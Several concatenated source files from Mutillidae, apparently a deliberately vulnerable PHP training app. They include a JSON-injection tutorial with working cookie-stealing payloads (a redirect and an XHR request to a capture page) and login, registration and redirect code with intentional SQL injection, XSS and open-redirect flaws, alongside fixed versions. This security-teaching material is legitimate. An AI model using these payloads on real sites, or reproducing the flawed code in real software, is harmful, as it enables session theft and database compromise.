						<span class="report-header">JSON Injection: Finding injection point</span>
						<br/><br/>
						With input points identified, we send recognizable input then check the JSON
						returned by the server to see if our canary is located in the JSON. Burp is a 
						good tool for this because the "Intruder" can automatically inject each 
						input then tell us if it sees that input in the response from the server. Tools
						are not neccesary. We could just as easily check the server response by 
						viewing the source of the web page after we inject canaries but tools can
						make this process more efficient once the learning curve of the tool is
						overcome.
						<br/><br/>
						If we send the word "CANARY" into each input, we can see if that input ends up
						in the response generically (great for cross site scripting) or specifically in
						the JSON (which means we might be able to perform JSON injection). You can inject
						with Firebug by adding "CANARY" into the tool list drop down, use Burp,
						use Tamper Data, or other methods. 
						<br/><br/>
						On this page, the value sent in one particular parameter "ToolID" seems to show up
						in the response JSON. This is potentially good (or potentially bad if your 
						the developer). Lets inject ToolID and looks at the resulting JSON.
						<br/><br/>
						Get the response using your favorite method and search for your input ("Canary" in 
						this example). Here is a greatly truncated example response.
						<br/>
<code>
try{
	var gPenTestToolsJSON = ( 
		{"query": {
			"toolIDRequested": "<span class="important-code">CANARY</span>", 
			"penTestTools": []}} );
	}catch(e){
		alert("Error trying to evaluate JSON: " + e.message);
	};
</code>
<br/>
						Note the developer outputs the value of the "ToolID" parameter into the JSON.
						If the developer encodes the output as a JavaScript string, this is ok. The 
						OWASP ESAPI includes a method "encodeForJavaScript()" which performs this 
						encoding.
						<br/><br/>
						Did the developer encode the output? We will check to find out. If the developer
						did not encode, chances are the JSON is vulnerable. (What if the developer used
						input validation? In that case, try to use SQL injection to inject the payload
						into the database table from which the data is fetched. Output encoding
						will protect the site even if the database is infected by a worm, SQLi, or
						a rouge DBA.
						<br/><br/>
						To check for encoding, send it characters which most certainly should be encoded.
						This would be any characters that are not alphanumeric. This example will use
						the string "{\'"CANARY"\'}" so we can test a few useful characters in one
						test (single-quotes, double-quotes, parenthesis are all handy). 
						Here is the response. We note that the site has a defect as the characters
						are not output encoded. Again this is just a fraction of the response.
						<br/>
<code>
try{
	var gPenTestToolsJSON = ( 
		{"query": {
		"toolIDRequested": "<span class="important-code">{\'"CANARY"\'}</span>", 
		"penTestTools": []}} );
}catch(e){
	alert("Error trying to evaluate JSON: " + e.message);
};
</code>
						<br/>
						As usual, pen-testing is a lot of mapping and discovery research followed by a short exploit. 
						So far we found the inputs into the page, figured out which input is output into the JSON,
						figured out where in the JSON the output lands, and
						figured out the output is not properly encoded due to a defect.
						<br/><br/>
						The next step is exploitation. We need to decide on what context to expliot. Web pages offer choices 
						because there is more than one interpreter listening. There is obviously an HTML interpreter
						and perhaps slightly less obvious there is a JavaScript interpreter listenting. We could also
						choose to poison the existing JSON context rather than break-out into HTML or JavaScript. Perhaps
						we could poison the JSON with false values of our choosing. Lets choose to break-out into 
						JavaScript and execute some JavaScript code of our choosing as an example. 
						<br/><br/>
						This requires determining how to "escape" the currrent
						context so we can start a new command. The context is JSON. We want to break-out or
						escape the JSON and execute some JavaScript. We need to look where our canary landed
						carefully so we can end the current JSON statement and start a new JavaScript code
						statement. We need to insert characters to end the JSON by completing the JSON with the 
						characters that would naturally end the JSON. Work backwards from the canary and notate
						each character that "opened". We have a double-quote that quotes our canary, 
						before that an open curly-brace after "query",
						another open curly-brace before "query", and that opening parenthsis.
<code>
try{
	var gPenTestToolsJSON = <span class="important-code">(</span> 
		<span class="important-code">{</span>"query": <span class="important-code">{</span>
			"toolIDRequested": <span class="important-code">"</span>
</code>
						<br/>
						To break out of the JSON context, we just insert those characters counterparts to 
						"close-out" those opening characters. When injecting JavaScript it is a good idea
						to also add a semicolon to our "close-out" because valid JavaScript statements end
						in semi-colons. To deal with all the JSON that comes after
						our canary, we will insert a comment to comment all that ending JSON out. Between
						our "close-out" characters and our ending comment goes our payload. We chose 
					   JavaScript so our payload will be a well-formed JavaScript statement.
					   <br/><br/>
					   Be careful. It is important to end the statement exactly as it started. Watch out for
					   spaces that matter and be certain the order of the characters injected complements
					   the characters being closed-out. Assuming a simple alert statement is our payload, lets
					   match each character one-by-one. The double-quote, first curly-brace, second curly-brace,
					   closing parenthesis, then a semi-colon terminate the JSON. We inject our payload next, 
					   then a comment to comment-out what would have become the rest of the JSON. NOTE: We URL
					   encode certain characters (i.e. semi-colons) because they could break the web server otherwise
					   making the web-server return a 500 error. 
					   <br/>
<code>
	try{
		var gPenTestToolsJSON = <span class="important-code">(</span> 
			<span class="important-code">{</span>"query": <span class="important-code">{</span>
				"toolIDRequested": <span class="important-code">"</span><span class="important-code" style="color:red">"}} )%3b</span><span class="important-code" style="color:blue">alert(1)%3b</span><span class="important-code" style="color:green">//</span>
</code>
						<br/>
						All together the injection looks like this example. Inject this exploit instead of the word "canary".
						<br/><br/>
<code>
	<span class="important-code" style="color:red">"}} )%3b</span><span class="important-code" style="color:blue">alert(1)%3b</span><span class="important-code" style="color:green">//</span>
</code>
<!-- "}} )%3balert(1)%3b// -->
						<br/>
						Using Burp capture or View Source, view the response. Also note the popup in your browser. The JavaScript injection
						is complete.
						<br/>
<code>
try{
	var gPenTestToolsJSON = ( {"query": {"toolIDRequested": ""}} );alert(1);//", "penTestTools": []}} );
}catch(e){
	alert("Error trying to evaluate JSON: " + e.message);
};
</code>
					<br/><br/>
						Task for student: Perform an HTML injection then a JSON injection.
					<br/><br/>	
					<span class="report-header">Advanced Injections</span>
					<br/><br/>
					Following the pattern of identifying an injection point, determining a prefix
					to close out existing code, a payload, and a suffix to comment out (or complete)
					existing trailing code, we can gradually increase our payload until the 
					desired affect is achived.
					<br/><br/>
					The initial goal is to prove injected code will execute.
					<br/><br/>
					<span class="report-header">Beginner: Pop up an alert box to show injection worked</span>
					<br/><br/>
						Unencoded: &quot;}} );alert(1);//<br/>
						Complete Injection: &quot;}} )%3balert(1)%3b//<br/>
						Prefix:		&quot;}} )%3b<br/>
						Payload:	alert(1)%3b<br/>
						Suffix:		//
					<br /><br />
					Copy and Paste:
					<br />
<code>
"}} )%3balert(1)%3b//<br/>
</code>
					<br/><br/>
					<span class="report-header">Intermediate: Steal cookie with redirection</span>
					<br/><br/>
					Unencoded:<code>&quot;}} );document.location=&quot;http://localhost/mutillidae/capture-data.php?cookie=&quot; + document.cookie;//</code><br/>
					Prefix:<code>&quot;}} )%3b</code><br/>
					Payload:<code>document.location%3d%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3b</code><br/>
					Suffix:<code>//</code><br/>
					Complete Injection: <code>&quot;}} )%3bdocument.location%3d%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3b//</code>
					<br /><br />
					Copy and Paste:
					<br />
<code>
&quot;}} )%3bdocument.location%3d%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3b//
</code>
					<br/><br/>
					<span class="report-header">Professional: Steal cookies with XHR injection</span>
					<br/>
					--------------------------------------------------------------------------------<br/>
					Generic XHR using GET and XMLHttpRequest to steal cookies <br/>
				 	 - prefix and suffix as neccesary<br/>
				 	 - This is optimized for Firefox which has XMLHttpRequest. Some newer IE will as well.<br/>
				 	 NOTE: During Reconnassaince, study your target to determine what kind of browser<br/>
				 	 they have so the scripts can be tailored and testing for those browsers.<br/>
					--------------------------------------------------------------------------------
					<br/><br/>
					This is a &quot;UDP-style GET&quot;. We fire and forget but cannot know if succeeded or failed. Perfect
					for using against savvy users.
					<br /><br />
					Copy and Paste:
					<br />
<code>
&lt;script&gt;
	var lXMLHTTP;
	try{ 
		var lAction = &quot;http://localhost/mutillidae/capture-data.php?cookie=&quot; + document.cookie;
		lXMLHTTP = new XMLHttpRequest(); 
		lXMLHTTP.onreadystatechange = function(){};
		lXMLHTTP.open(&quot;GET&quot;, lAction);
		lXMLHTTP.send(&quot;&quot;);
	}catch(e){} 
&lt;/script&gt; 	
</code>
<br />
					--------------------------------------<br />
					URL Encoded Version<br />
					--------------------------------------<br />
					Prefix:		&quot;}} )%3b<br />
					Payload:	var+lXMLHTTP%3btry%7b+var+lAction+%3d+%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3blXMLHTTP+%3d+new+XMLHttpRequest()%3b+lXMLHTTP.onreadystatechange+%3d+function()%7b%7d%3blXMLHTTP.open(%22GET%22%2c+lAction)%3blXMLHTTP.send(%22%22)%3b%7dcatch(e)%7b%7d<br />
					Suffix:		//<br />
					Complete Injection: &quot;}} )%3bvar+lXMLHTTP%3btry%7b+var+lAction+%3d+%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3blXMLHTTP+%3d+new+XMLHttpRequest()%3b+lXMLHTTP.onreadystatechange+%3d+function()%7b%7d%3blXMLHTTP.open(%22GET%22%2c+lAction)%3blXMLHTTP.send(%22%22)%3b%7dcatch(e)%7b%7d//
					<br /><br />
					Copy and Paste:
					<br />
<code>
&quot;}} )%3bvar+lXMLHTTP%3btry%7b+var+lAction+%3d+%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3blXMLHTTP+%3d+new+XMLHttpRequest()%3b+lXMLHTTP.onreadystatechange+%3d+function()%7b%7d%3blXMLHTTP.open(%22GET%22%2c+lAction)%3blXMLHTTP.send(%22%22)%3b%7dcatch(e)%7b%7d//
</code>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
?><div class="page-title">Usage Instructions</div>

<?php include_once './includes/back-button.inc';?>

<span>
	Get rid of PHP "strict" errors. They are not compatible with the OWASP ESAPI classes in use in Mutillidae 2.0. The
	error modifies headers disrupting functionality so this is not simply an annoyance issue. 
	To do this, go to the PHP.INI file and change the line that reads "error_reporting = E_ALL | E_STRICT" to 
	"error_reporting = E_ALL & ~E_NOTICE & ~E_WARNING & ~E_DEPRECIATED". Once the modification is complete,
	restart the Apache service. If you are not sure how to restart the service, reboot.
	<br/><br/>
	Important note: If you use XAMPP Lite or various version of XAMPP on various operating systems, the path for your 
	php.ini file may vary. You may even have multiple php.ini files in which case try to modify the one in the Apache
	directory first, then the one in the PHP file if that doesnt do the trick.
	<br/><br/>
	Windows possible default location C:\xampp\php\php.ini, C:\XamppLite\PHP\php.ini, others
	Linux possible default locations: /XamppLite/PHP/php.ini, /XamppLite/apache/bin/php.ini, others 
</span>
<div class="page-title">Secret PHP Server Configuration Page</div>

<?php include_once './includes/back-button.inc';?>

<div>&nbsp;</div>

<?php
	$lShowPHPInfo = FALSE;
	if (!isset($_SESSION["security-level"])){
		$lShowPHPInfo = TRUE;
	}// end if

	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure   			
   		case "1": // This code is insecure
			$lShowPHPInfo = TRUE;
   		break;
   		case "2":
   		case "3":
   		case "4":
   		case "5": // This code is fairly secure 
   			if(isset($_SESSION['is_admin'])){
   				if($_SESSION['is_admin'] == 'TRUE'){
					$lShowPHPInfo = TRUE;
   				}// end if is_admin
   			}// end if isseet $_SESSION['is_admin']
  		break;
	}// end switch
	
	if($lShowPHPInfo){
		$lIncludedFiles = get_included_files();
		$lBaseFile = $lIncludedFiles[0];
		$lThisFile = __FILE__;
		if ($lBaseFile === $lThisFile){
			$lIncluded = FALSE;		
		}else{
			$lIncluded = TRUE;
		}// end if
		
		if ($lIncluded == TRUE){
			ob_start();
			phpinfo();
			preg_match ('%<style type="text/css">(.*?)</style>.*?<body>(.*?)</body>%s', ob_get_clean(), $matches);
			# $matches [1]; # Style information
			# $matches [2]; # Body information

			echo "<div class='phpinfodisplay'><style type='text/css'>\n",
			    join( "\n",
			        array_map(
			            create_function(
			                '$i',
			                'return ".phpinfodisplay " . preg_replace( "/,/", ",.phpinfodisplay ", $i );'
			                ),
			            preg_split( '/\n/', trim(preg_replace( "/\nbody/", "\n", $matches[1])) )
			            )
			        ),
			    "</style>\n",
			    $matches[2],
			    "\n</div>\n";
		}else{
			echo phpinfo(INFO_ALL);
		}// end if $lIncluded
	}else{
		echo '<table style="margin-left:auto; margin-right:auto;"><tr><td class="error-message">Secure sites do not expose administrative or configuration pages to the Internet</td></tr></table>';		
	}//end if $lShowPHPInfo
?><iframe
	id="id-iframe" 
	frameborder="0"
	scrolling="no" 
	width="100%" 
	height="600px" 
	src="PMA_Application/" 
	style="margin-left:auto; margin-right:auto;"
	>
</iframe><?php

   	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure
   		case "1": // This code is insecure
   			$lProtectCookies = FALSE;
   		break;
		
		case "2":
		case "3":
		case "4":
   		case "5": // This code is fairly secure
   			$lProtectCookies = TRUE;
   		break;
   	}// end switch

    /* Precondition: $_REQUEST["do"] is not NULL */
    switch ($_REQUEST["do"]) {
	    case "logout":
		    $_SESSION["loggedin"] = "False";
		    $_SESSION['logged_in_user'] = '';
		    $_SESSION['logged_in_usersignature'] = '';
			$_SESSION['uid'] = '';
			$_SESSION['is_admin'] = 'FALSE';		    
	    	setcookie("uid", "", time()-2);
	    	setcookie("username", "", time()-2);
	    	header("Location: index.php?page=login.php", TRUE, 302);
	    	exit(0);
	    break;//case "logout"
	
		case "toggle-hints":
			// see if their even is a cookie
			if (isset($_COOKIE["showhints"])){
				$l_showhints = $_COOKIE["showhints"];
			}else{
				$l_showhints = 0;
			}// end if

			/* Make hints go up a level or roll over*/
			$l_showhints += 1;
			if ($l_showhints > $C_MAX_HINT_LEVEL){
				$l_showhints = 0;
			}// end if
			
			/* Syncronize session with cookie. User might have changed cookie. */
			$_SESSION["showhints"] = $l_showhints_cookie;
			
			switch ($l_showhints_cookie){
				case 0: $_SESSION["hints-enabled"] = "Disabled (".$l_showhints_cookie." - I try harder)"; break;
				case 1: $_SESSION["hints-enabled"] = "Enabled (".$l_showhints_cookie." - 5cr1pt K1dd1e)"; break;
				case 2: $_SESSION["hints-enabled"] = "Enabled (".$l_showhints_cookie." - Noob)"; break;
			}// end switch
			
			/*
			 * If in secure mode, we want the cookie to be protected
			 * with HTTPOnly flag. There is some irony here. In secure code,
			 * we are to ignore authorization cookies, so we are protecting
			 * a cookie we know we are going to ignore. But the point is to
			 * provide an example to developers of proper coding techniques.
			 */
			if ($lProtectCookies){
				setcookie('showhints', $l_showhints.";HTTPOnly");
			}else {
				setcookie('showhints', $l_showhints);
			}// end if
			
			$_COOKIE["showhints"] = $l_showhints;
		    header("Location: ".$_SERVER['SCRIPT_NAME'].'?'.str_ireplace('do=toggle-hints&', '', $_SERVER['QUERY_STRING']), true, 302);
			exit();
		break;//case "toggle-hints"
		
		case "toggle-security":
			/* Make security level go up a level or roll over*/
			$lSecurityLevel = $_SESSION["security-level"];
						
			if ($lSecurityLevel == '0') {
				$lSecurityLevel = '1';
			}else if($lSecurityLevel == '1'){
				$lSecurityLevel = '5';
			}else{
				$lSecurityLevel = '0';
		    }// end if

		    /* Disable hints unless we are on security level 0.
		     * There is a way to defeat this.
		     */
			if ($lSecurityLevel > 1){
		    	$_SESSION["showhints"] = FALSE;
				$_SESSION["hints-enabled"] = "Disabled";
				setcookie("showhints", "0");
			}// end if		    

			// change how much information errors barf onto the page.
		    $CustomErrorHandler->setSecurityLevel($lSecurityLevel);
		    $LogHandler->setSecurityLevel($lSecurityLevel);

		    $_SESSION["security-level"] = $lSecurityLevel;
		    
		    header("Location: ".$_SERVER['SCRIPT_NAME'].'?'.str_ireplace('do=toggle-security&', '', $_SERVER['QUERY_STRING']), true, 302);
		    exit();
		break;//case "toggle-hints"		
		
		default: break;
    }// end switch
?><?php
    try {
	   	switch ($_SESSION["security-level"]){
	   		case "0": // This code is insecure
	   		case "1": // This code is insecure
				/*
				 * Grab username and password from parameters. 
				 * Notice in insecure mode, we take parameters from "REQUEST" which
				 * could be GET OR POST. This is not correct. The page
				 * intends to receive parameters from POST and should
				 * restrict parameters to POST only.
				 */ 
				$username = $_REQUEST["username"];
				$password = $_REQUEST["password"];
	   			
	   			$query = 	"SELECT * FROM accounts WHERE username='". 
			   				$username.
			   				"' AND password='". 
			   				$password.
			   				"'";		
	   			$lProtectCookies = FALSE;
	   		break;
		    		
			case "2":
			case "3":
			case "4":
	   		case "5": // This code is fairly secure
	   			/* Restrict paramters to POST */
				$username = $_POST["username"];
				$password = $_POST["password"];
	   			
	   			/* 
	  			 * Note: While escaping works ok in some case, it is not the best defense.
	  			 * Using stored procedures is a much stronger defense.
	  			 */
	   			$query  = 	"SELECT * FROM accounts WHERE username='". 
				   			$conn->real_escape_string($username) .
				   			"' AND password='". 
				   			$conn->real_escape_string($password). 
				   			"'";
	   			$lProtectCookies = TRUE;
	   		break;
	   	}// end switch

		$LogHandler->writeToLog($conn, "Attempt to log in by user: " . $username);
	   	
		$result = $conn->query($query);
		if (!$result) {
	    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
	    }// end if

	    if ($result->num_rows > 0) {
		    $row = $result->fetch_object();
			$failedloginflag=0;
			$_SESSION['loggedin'] = 'True';
			$_SESSION['uid'] = $row->cid;
			$_SESSION['logged_in_user'] = $row->username;
			$_SESSION['logged_in_usersignature'] = $row->mysignature;
			$_SESSION['is_admin'] = $row->is_admin;

			/*
			/* Set client-side auth token. if we are in insecure mode, we will
			 * pay attention to client-side authorization tokens. If we are secure,
			 * we dont use client-side authortization tokens and we ignore any
			 * attempts to use them.
			 * 
			 * If in secure mode, we want the cookie to be protected
			 * with HTTPOnly flag. There is some irony here. In secure code,
			 * we are to ignore authorization cookies, so we are protecting
			 * a cookie we know we are going to ignore. But the point is to
			 * provide an example to developers of proper coding techniques.
			 * 
			 * Note: Ideally this cookie must be protected with SSL also but
			 * again this is just a demo. Once your in SSL mode, maintain SSL
			 * and escalate any requests for HTTP to HTTPS.
			 */
			if ($lProtectCookies){
				$lUsernameCookie = $Encoder->encodeForURL($row->username);
				setcookie("username", $lUsernameCookie, 0, "", "", FALSE, TRUE);
				setcookie("uid", $row->cid, 0, "", "", FALSE, TRUE);
			}else {
				//setrawcookie() allows for response splitting
				$lUsernameCookie = $row->username;
				setrawcookie("username", $lUsernameCookie);
				setrawcookie("uid", $row->cid);
			}// end if
			
			$LogHandler->writeToLog($conn, "Logged in user: " . $row->username . " (" . $row->cid . ")");
			
			header('Location: index.php', true, 302);
		} else {
			$LogHandler->writeToLog($conn, "Failed login for user: " . $row->username);
			$failedloginflag=1;
    	}// end if ($result->num_rows > 0)
	    
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, $query);
	}// end try
?><?php
	try {	    	
		switch ($_SESSION["security-level"]){
	   		case "0": // This code is insecure
	   		case "1": // This code is insecure 
	   			/* This code is insecure. Direct object references in the form of the "forwardurl"
	   			 parameter give the user complete control of the input. Contrary to popular belief, 
	   			 input validation, blacklisting, etc is not the best defense. The best defenses are 
	   			 provably secure 100% of the time. For direct object references, there are two defenses.
	   			 Authorization via ACL or Entitlements is used when transaction requires authentication.
	   			 This transaction (forwarding URL) does not require authentication so the other method is used;
	   			 mapping. Mapping substitutes a harmless token for the direct object. The direct object in 
	   			 this case is the page the user is being forwarded to. We will use mapping to secure this code.
	   			
	   			 Note: For static links, the best defense is to simply hardcode the links in an anchor tag.
	   			 This exercise will use mapping to show how it works, but it should be recognized that 
	   			 for giving the user links to click, hardcoding is the best defense.
	   			*/
	   			
	   			/* insecure: this would take input from GET or POST. This can result in an HTTP Parameter Polution
	   			 * attack. If a site uses POST, then grab input from _POST. Use _GET for gets. HPP can
	   			 * occur more easily when input is ambiguous.
	   			 * 
	   			 * Also, the web is weakly typed. All data is strings. It doesnt matter what the developers
	   			 * thinks the input is (int, string, char, etc.). The fact is that HTTP is text. if the 
	   			 * "forwardurl" is expected to be integer, it should be validated as such. If string, then 
	   			 * validate as string. 
	   			 */
	   			$forwardurl=$_REQUEST["forwardurl"];
				$LogHandler->writeToLog($conn, "Redirected user to: " . $forwardurl);				
				echo '<meta http-equiv="refresh" content="0;url='.$forwardurl.'">';
				//header("Location: " . $forwardurl); /* Redirect browser */
				exit; /* prevent other headers from runnning */				
	   		break;
	    		
	   		case "2":
	   		case "3":
	   		case "4":
	   		case "5": // This code is fairly secure
	   			/* The "forwardurl" is expected to be integer, so validate as such. Also,
	   			 * dont use _REQUEST as this would allow a POSTed "forwardurl" to be sent 
	   			 * along with a URL query parameter "forwardurl" as well. This type of sloppy
	   			 * variable fetching can result in HTTP Parameter Pollution. 
	   			 */
	   			$forwardurl=$_GET["forwardurl"];
	
	   			/* We expect small int. validate positive integer between 0-9.
	   			 * Regex pattern makes sure the user doesnt send in characters that
	   			 * are not actually digits but can be cast to digits.
	   			 */	
	   			$isDigits = (preg_match("/\d{1,2}/", $forwardurl) == 1);    			
	   			if ($isDigits && $forwardurl > 0 && $forwardurl < 11){
					$lURL = "";
					/* Insecure Direct Object References are patched
					 * by removing the direct object reference all together.
					 * Web applications are "fronts" for services. Some web
					 * sites offer web pages, some offer XML, SOAP, or other
					 * services. In any case, the web site should not "give away"
					 * information about internal objects such as database IDs,
					 * redirection URLs, system file names, or application
					 * paths/configuration.
					 * 
					 * Offer the user harmless tokens instead of actual 
					 * objects. In this case, we use integers to map to
					 * the direct object, which is the forwarding URL.
					 */ 
	   				switch($forwardurl){
	   					case 1: $lURL = "http://www.irongeek.com/";break;
	   					case 2: $lURL = "http://www.owasp.org";break;
	   					case 3: $lURL = "http://www.issa-kentuckiana.org/";break;
	   					case 4: $lURL = "http://www.owasp.org/index.php/Louisville";break;
	   					case 5: $lURL = "http://www.pocodoy.com/blog/";break;
	   					case 6: $lURL = "http://www.room362.com/";break;
	   					case 7: $lURL = "http://www.isd-podcast.com/";break;
	   					case 8: $lURL = "http://pauldotcom.com/";break;
	   					case 9: $lURL = "http://www.php.net/";break;
	   					case 10:$lURL = "https://addons.mozilla.org/en-US/firefox/collections/jdruin/pr/";break;
	   				}// end switch($forwardurl)

					$LogHandler->writeToLog($conn, "Redirected user to: " . $lURL);				
	   				echo '<meta http-equiv="refresh" content="0;url='.$lURL.'">';/* Redirect browser */
					//header("Location: " . $lURL); /* Redirect browser */
					exit; /* prevent other headers from runnning */		
	   			}else{
	   				throw(new Exception("Expected integer input. Cannot process request. Support team alerted."));
	   			}// end if
	   		break;
	   	}// end switch ($_SESSION["security-level"])

	}catch(Exception $e){
		echo $CustomErrorHandler->FormatError($e, "Error in redirector. Cannot forward URL.");
	}// end try
?><div class="page-title">Register for an Account</div>

<?php include_once './includes/back-button.inc';?>

<?php 
	if (isset($_POST["register-php-submit-button"])){
		
		try {
			$username = $_POST["username"];
			$password = $_POST["password"];
			$confirm_password = $_POST["confirm_password"];
			$mysignature = $_POST["my_signature"];
			$lValidationFailed = false;
			
		   	switch ($_SESSION["security-level"]){
		   		case "0": // This code is insecure
		   		case "1": // This code is insecure
		   			// DO NOTHING: This is equivalent to using client side security		
					$query = "INSERT INTO accounts (username, password, mysignature) VALUES ('" . 
					$username ."', '" . 
					$password . "', '" . 
					$mysignature .
					"')";
					$lUsernameText = $username; //allow XSS by not encoding
		   		break;
			    		
		   		case "2":
		   		case "3":
		   		case "4":
	   			case "5": // This code is fairly secure
		  			/* 
		  			 * Definition: Validation
		  			 * 
		  			 * Check for data type AND
		  			 * Check for data length AND
		  			 * Check for range AND
		  			 * Check for pattern
		  			 * 
		  			 * Validation is not a "thing". It is a process.
		  			 * 
		  			 * NOTE: Input validation is excellent but not enough. The output must be
		  			 * encoded per context. For example, if output is placed in HTML,
		  			 * then HTML encode it. Blacklisting is a losing proposition. You 
		  			 * cannot blacklist everything. The business requirements will usually
		  			 * require allowing dangerous charaters. In the example here, we can 
		  			 * validate username but we have to allow special characters in passwords
		  			 * least we force weak passwords. We cannot validate the signature hardly 
		  			 * at all. The business requirements for text fields will demand most
		  			 * characters. Output encoding is the answer. Validate what you can, encode it
		  			 * all.
		  			 * 
		  			 * Concerning SQL Injection, use parameterized stored procedures. Parameterized
		  			 * queries is not good enough. You cannot use least privilege with queries.
		  			 */
		   			$query = "INSERT INTO accounts (username, password, mysignature) VALUES ('" . 
					$conn->real_escape_string($username)  ."', '" . 
					$conn->real_escape_string($password) . "', '" . 
					$conn->real_escape_string($mysignature) .
					"')";
					$lUsernameText = $Encoder->encodeForHTML($username);
		   		break;
		   	}// end switch

			$LogHandler->writeToLog($conn, "Attempting to add account for: " . $username);				
		   	
		   	if (strlen($username) == 0) {
		   		$lValidationFailed = true;
				echo '<h1 class="error-message">Username cannot be blank</h1>';
		   	}// end if
					
		   	if ($password != $confirm_password ) {
				$lValidationFailed = true;
		   		echo '<h1 class="error-message">Passwords do not match</h1>';
		   	}// end if
				
		   	if (!$lValidationFailed){
				$result = $conn->query($query);
				if ($conn->affected_rows == -1) {
			    	throw (new Exception('Error inserting records: '.$conn->error, $conn->errorno));
			    }// end if
				echo '<h2 class="success-message">Account created for ' . $lUsernameText .'. '.$conn->affected_rows.' rows inserted.</h2>';
				$LogHandler->writeToLog($conn, "Added account for: " . $username);
		   	}// end if (!$lValidationFailed)
			
		} catch (Exception $e) {
			$LogHandler->writeToLog($conn, "Failed to add account for: " . $username);
			echo $CustomErrorHandler->FormatError($e, $query);
		}// end try
			
	}// end if (isset($_POST["register-php-submit-button"])){
?>

<div id="id-registration-form-div">
	<form action="index.php?page=register.php" method="post" enctype="application/x-www-form-urlencoded">
		<table style="margin-left:auto; margin-right:auto;">
			<tr id="id-bad-cred-tr" style="display: none;">
				<td colspan="2" class="error-message">
					Authentication Error: Bad user name or password
				</td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td colspan="2" class="form-header">Please choose your username, password and signature</td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td class="label">Username</td>
				<td><input type="text" name="username" size="20"></td>
			</tr>
			<tr>
				<td class="label">Password</td>
				<td><input type="password" name="password" size="20"></td>
			</tr>
			<tr>
				<td class="label">Confirm Password</td>
				<td><input type="password" name="confirm_password" size="20"></td>
			</tr>
			<tr>
				<td class="label">Signature</td>
				<td><textarea rows="10" cols="50" name="my_signature"></textarea></td>
			</tr>			
			<tr><td></td></tr>
			<tr>
				<td colspan="2" style="text-align:center;">
					<input name="register-php-submit-button" class="button" type="submit" value="Create Account" />
				</td>
			</tr>
			<tr><td></td></tr>
		</table>
	</form>
</div>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li><b>For XSS:</b>XSS is easy stuff. This one shows off stored XSS (someone can
								run across it later in another app that uses the same database). Check out
								the "User Info" page for the results of this stored XSS.
								"&lt;script&gt;alert("XSS");&lt;/script&gt;" is the classic XSS demo, but 
								there are far more interesting things you could do which I plan show in a
								video later. Also, check out 
								<a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheet Sheet</a>
								for more ways you can encode XSS attacks that may allow you to get around 
								some filters.
							</li>
						  	<li><b>For SQL Injection:</b> Mostly errors, but they reveal too much information about 
								the application.
							</li>
							<li>
							Try SQL injection probing by entering single-quotes, double-quotes, 
							paranthesis, double-dash (--), hyphen-asterik (/*), and 
							closing-parenthesis-hyphen-hyphen ()--)
							</li>
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/sql-injection-tutorial.inc';
		include_once './includes/cross-site-scripting-tutorial.inc';
		include_once './includes/cross-site-request-forgery-tutorial.inc';
	}// end if
?><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
		<title>Rene Magritte Frame</title>
	</head>
	<body onload="objHoverDiv = document.getElementById('id-hover-div');">
		<img style="text-align: center;" alt="Rene Magritte Frame" width="464px" height="582px" src="./images/rene-magritte-frame.jpg"">
	</body>
	<script type="text/javascript">
					
   		/* ------------------------------------------
	    * ANTI-CLICK-JACKING
	    * ------------------------------------------ */
		/* JavaScript framebuster anti-clickjacking defense
		* for browsers older than IE 8 or Firefox 3.6
		*/
		//if (top.frames.length!=0)top.location=self.document.location;
	</script>
</html>User-agent: *
Disallow: ./passwords/
Disallow: ./config.inc
Disallow: ./classes/
Disallow: ./javascript/
Disallow: ./owasp-esapi-php/
Disallow: ./documentation/<div class="page-title">Login</div>

<?php include_once './includes/back-button.inc';?>

<table style="margin-left:auto; margin-right:auto; width: 600px;">
	<tr>
		<td class="form-header">"Secret" administrative or configuration pages</td>
	</tr>
	<tr><td></td></tr>
	<tr>
		<td>Showing server configurations on pages allowed through the firewall is a bad idea. "Hiding" pages by not linking to them so you believe you are the only one who knows the URL doesnt work. There are tools to brute force the URL, shoulder surfing, log history, browser history, router-firewall-proxy history, scanners, guessing and other methods can get these URLs. or admin functions, create a second site inside the firewall to segregate these pages from the Internet facing site.</td>
	</tr>
	<tr><td></td></tr>
	<tr>
		<td style="text-align:center;">
			I wonder what clever name the server admin would give to a PHP page that shows server configuration information? Hint: What is the function in PHP that dumps server configuration information into a nice table? Enable hints if you need more help.
		</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
</table>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table style="margin-left:auto; margin-right:auto; width: 600px;">
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li>
						  		The phpinfo function dumps PHP server configuration information to a nice table.
							</li>
						  	<li>PHP pages typically end in the PHP extension.</li>
							<li>There are bots on the Internet trolling sites looking for a special page "phpinfo.php"</li>
							<li>Try brute forcing the page names in the page parameter with Burp-Intruder in sniper mode</li>
						</ul>
